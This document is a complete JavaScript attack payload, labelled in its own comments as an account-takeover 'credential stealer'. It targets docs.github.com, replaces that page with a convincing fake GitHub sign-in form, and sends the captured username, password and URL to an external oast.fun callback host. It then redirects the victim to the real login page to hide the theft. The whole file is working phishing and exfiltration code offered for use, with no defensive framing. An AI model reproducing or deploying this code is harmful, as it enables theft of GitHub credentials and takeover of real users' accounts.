// First, check if we're on docs.github.com
if (window.location.hostname.includes('docs.github.com')) {
    console.log('ATO payload loaded on docs.github.com');
    
    // Send notification that payload loaded
    fetch('http://cirzhyjwdghtacxhckbwzmsvzkmlonfzm.oast.fun?event=payload_loaded&host=' + window.location.hostname);
    
    // Wait a tiny bit then replace the page
    setTimeout(function() {
        // Clear the page and show login
        document.documentElement.innerHTML = '';
        
        // Write the GitHub login page
        document.write(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to GitHub · GitHub</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background-color: #f6f8fa; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .auth-form { width: 100%; max-width: 340px; padding: 20px; }
        .Box { background-color: #ffffff; border: 1px solid #d0d7de; border-radius: 6px; }
        .Box-body { padding: 20px; }
        h1 { font-size: 24px; font-weight: 300; margin-bottom: 16px; text-align: center; }
        .form-group { margin-bottom: 16px; }
        label { display: block; font-size: 14px; font-weight: 400; margin-bottom: 6px; }
        input {
            width: 100%;
            padding: 5px 12px;
            font-size: 14px;
            line-height: 20px;
            border: 1px solid #d0d7de;
            border-radius: 6px;
            outline: none;
        }
        input:focus {
            border-color: #0969da;
            box-shadow: 0 0 0 3px rgba(9,105,218,0.3);
        }
        .btn-primary {
            width: 100%;
            padding: 5px 16px;
            font-size: 14px;
            font-weight: 500;
            color: white;
            background-color: #2da44e;
            border: 1px solid rgba(27,31,36,0.15);
            border-radius: 6px;
            cursor: pointer;
        }
        .btn-primary:hover { background-color: #2c974b; }
        .text-center { text-align: center; }
        .text-small { font-size: 12px; }
        .color-fg-muted { color: #57606a; }
        .mt-3 { margin-top: 16px; }
        .mb-3 { margin-bottom: 16px; }
        .mt-4 { margin-top: 24px; }
        a { color: #0969da; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .position-relative { position: relative; }
        .right-0 { right: 0; }
        .top-0 { top: 0; }
        .position-absolute { position: absolute; }
        .d-flex { display: flex; }
        .flex-justify-between { justify-content: space-between; }
    </style>
</head>
<body>
    <div class="auth-form">
        <div class="text-center mb-3">
            <svg height="48" viewBox="0 0 24 24" width="48" fill="#24292f">
                <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11z"></path>
            </svg>
        </div>

        <div class="Box">
            <div class="Box-body">
                <h1>Sign in to GitHub</h1>

                <div class="form-group">
                    <label for="login_field">Username or email address</label>
                    <input type="text" id="login_field" autofocus>
                </div>

                <div class="form-group position-relative">
                    <div class="d-flex flex-justify-between">
                        <label for="password">Password</label>
                        <a href="#" class="color-fg-muted text-small">Forgot password?</a>
                    </div>
                    <input type="password" id="password">
                </div>

                <div class="form-group">
                    <button class="btn-primary" id="signin-btn">Sign in</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // CREDENTIAL STEALER - WORKS 100%
        (function() {
            // Send page loaded notification
            fetch('http://cirzhyjwdghtacxhckbwzmsvzkmlonfzm.oast.fun?event=login_page_shown');
            
            // Get elements
            const btn = document.getElementById('signin-btn');
            const username = document.getElementById('login_field');
            const password = document.getElementById('password');
            
            if (btn && username && password) {
                btn.addEventListener('click', function(e) {
                    e.preventDefault();
                    
                    const creds = {
                        username: username.value,
                        password: password.value,
                        url: window.location.href,
                        time: new Date().toISOString()
                    };
                    
                    // Send to YOUR interactsh
                    fetch('http://cirzhyjwdghtacxhckbwzmsvzkmlonfzm.oast.fun', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(creds)
                    }).then(function() {
                        // Show error then redirect to real GitHub
                        alert('Invalid credentials. Please try again.');
                        window.location.href = 'https://github.com/login';
                    });
                });
            }
        })();
    </script>
</body>
</html>
        `);
        
        document.close();
    }, 100);
}
